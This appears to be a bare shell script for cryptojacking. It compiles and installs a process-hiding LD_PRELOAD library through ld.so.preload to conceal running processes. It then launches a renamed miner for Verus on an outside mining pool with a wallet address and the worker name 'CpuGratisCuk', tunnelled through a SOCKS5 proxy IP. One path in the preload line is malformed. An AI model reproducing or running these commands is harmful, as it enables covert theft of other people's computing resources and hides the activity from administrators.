sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
sudo echo /usr/local/lib/libprocesshider.so >> /sudo etc/ld.so.preload
screen -dmS proxy python3 proxy.py
./mnc -a verus -o stratum+tcp://na.luckpool.net:3956 -u RBnUfk8TyUPeWMjFogjLkBtnzaGjmGJznL.CpuGratisCuk.... -p x -t 2 -q -x socks5://192.111.130.2:4145